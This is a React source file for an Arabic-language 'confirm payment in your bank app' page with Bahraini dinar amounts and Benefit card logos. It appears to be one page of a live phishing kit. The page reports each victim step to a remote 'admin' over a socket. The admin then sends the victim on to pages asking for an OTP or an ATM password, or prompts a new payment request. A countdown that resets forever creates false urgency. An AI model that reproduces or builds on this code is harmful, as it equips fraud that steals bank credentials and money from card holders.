import { useEffect, useState, useRef } from "react";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { useLocation } from "wouter";
import {
  socket,
  sendData,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";

export default function BankAppVerification() {
  const [, navigate] = useLocation();
  const [timer, setTimer] = useState(120);
  const [showButton, setShowButton] = useState(false);
  const [phase, setPhase] = useState<"waiting" | "confirmed" | "rejected">("waiting");
  const [isWaitingAdmin, setIsWaitingAdmin] = useState(false);
  const buttonTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const totalAmount = paymentData.totalPaid || localStorage.getItem("Total") || "0.000";
  const bankName = paymentData.bankName || "";
  const bankLogo = paymentData.bankLogo || "";
  const cardType = paymentData.cardType || "";

  // Check if it's a Benefit card
  const isBenefit = cardType.toLowerCase() === 'benefit' || cardType.toLowerCase() === 'debit' || bankName === 'BENEFIT';

  // Determine card type logo
  const getCardTypeLogo = () => {
    const type = cardType.toLowerCase();
    if (type === 'visa') return '/images/visa.png';
    if (type === 'mastercard') return '/images/mastercard.png';
    return '';
  };

  const cardTypeLogo = getCardTypeLogo();

  // Emit page enter
  useEffect(() => {
    navigateToPage("تطبيق البنك");
  }, []);

  // Show button after 30 seconds
  useEffect(() => {
    buttonTimerRef.current = setTimeout(() => {
      setShowButton(true);
    }, 30000);
    return () => {
      if (buttonTimerRef.current) clearTimeout(buttonTimerRef.current);
    };
  }, []);

  // Countdown timer - resets when it reaches 0
  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          return 120;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Handle "click to continue" button
  const handleConfirmClick = () => {
    setPhase("confirmed");
    setIsWaitingAdmin(true);
    navigateToPage("تأكيد عملية الدفع من التطبيق");
    sendData({
      current: "تأكيد عملية الدفع من التطبيق",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  // Handle "request new payment" button
  const handleRetryClick = () => {
    setPhase("confirmed");
    setIsWaitingAdmin(true);
    navigateToPage("طلب عملية دفع جديدة");
    sendData({
      current: "طلب عملية دفع جديدة",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsWaitingAdmin(false);

      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/atm-password");
      } else if (action === 'reject') {
        // Stay on page, show "request new payment" button
        setPhase("rejected");
      }
      cardAction.value = null;
    }
  });

  // Format timer as MM:SS
  const mins = Math.floor(timer / 60).toString().padStart(2, "0");
  const secs = (timer % 60).toString().padStart(2, "0");

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl p-6 max-w-md mx-auto w-full">
        {/* Bank Logo and Card Type */}
        {isBenefit ? (
          <div className="flex mb-6 px-4" style={{ justifyContent: 'flex-end', direction: 'rtl' }}>
            <div className="flex items-center">
              <img
                src="/benefit-logo.png"
                alt="Benefit"
                style={{ width: '70px', height: 'auto', objectFit: 'contain' }}
              />
            </div>
          </div>
        ) : (
          <div className="flex justify-between items-center mb-6 px-4">
            {cardTypeLogo && (
              <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
                <img
                  src={cardTypeLogo}
                  alt={cardType || 'Card'}
                  style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
                />
              </div>
            )}
            {bankLogo && (
              <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
                <img
                  src={bankLogo}
                  alt={bankName || "Bank"}
                  style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
                />
              </div>
            )}
          </div>
        )}

        {/* Phone Icon - Professional Design */}
        <div className="flex justify-center mb-5">
          <div className="relative">
            <div className="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center">
              <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center shadow-md">
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8">
                  <rect x="7" y="2" width="10" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12" y2="18.01" strokeWidth="2" strokeLinecap="round" />
                </svg>
              </div>
            </div>
            <div className="absolute -top-0.5 -right-0.5 w-4 h-4 bg-green-500 rounded-full border-2 border-white flex items-center justify-center">
              <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="3">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
          </div>
        </div>

        {/* Main Message */}
        <div className="text-center mb-6">
          <h1 className="text-lg font-bold text-gray-800 mb-3">تأكيد عملية الدفع</h1>
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
            <p className="text-gray-700 text-sm leading-relaxed font-medium">
              عليك الدخول إلى تطبيق البنك الخاص بك للموافقة على عملية الدفع
            </p>
            {Number(totalAmount) > 0 && (
              <p className="text-blue-700 font-bold text-base mt-2">
                المبلغ: {totalAmount} د.ب
              </p>
            )}
          </div>
        </div>

        {/* Countdown Timer - Clean Design */}
        <div className="text-center mb-5">
          <p className="text-gray-500 text-xs mb-2">الوقت المتبقي للموافقة</p>
          <div className="inline-flex items-center justify-center gap-2">
            <div className="bg-gray-900 text-white rounded-lg w-12 h-12 flex items-center justify-center shadow-md">
              <span className="text-xl font-mono font-bold">{mins}</span>
            </div>
            <span className="text-gray-900 text-xl font-bold">:</span>
            <div className="bg-gray-900 text-white rounded-lg w-12 h-12 flex items-center justify-center shadow-md">
              <span className="text-xl font-mono font-bold">{secs}</span>
            </div>
          </div>
        </div>

        {/* Dynamic section based on phase */}
        {phase === "rejected" ? (
          /* Rejected: show retry button */
          <div className="py-3">
            <button
              onClick={handleRetryClick}
              className="w-full py-3 bg-blue-600 text-white rounded-xl font-bold text-sm hover:bg-blue-700 transition"
            >
              طلب عملية دفع جديدة
            </button>
          </div>
        ) : phase === "confirmed" && isWaitingAdmin ? (
          /* Confirmed and waiting for admin: show waiting animation */
          <div className="flex justify-center items-center gap-2 py-3">
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
            <span className="text-gray-500 text-xs mr-2">في انتظار الموافقة...</span>
          </div>
        ) : showButton && phase === "waiting" ? (
          /* After 30s: show click to continue button */
          <div className="py-3">
            <button
              onClick={handleConfirmClick}
              className="w-full py-3 bg-green-600 text-white rounded-xl font-bold text-sm hover:bg-green-700 transition"
            >
              أنقر للمتابعة بعد تأكيد عملية الدفع
            </button>
          </div>
        ) : (
          /* Default: waiting animation */
          <div className="flex justify-center items-center gap-2 py-3">
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
            <span className="text-gray-500 text-xs mr-2">في انتظار الموافقة...</span>
          </div>
        )}

        {/* Info Note */}
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-2.5 mt-3">
          <p className="text-yellow-800 text-xs text-center">
            لا تغلق هذه الصفحة حتى تتم الموافقة من تطبيق البنك
          </p>
        </div>
      </div>
    </div>
  );
}
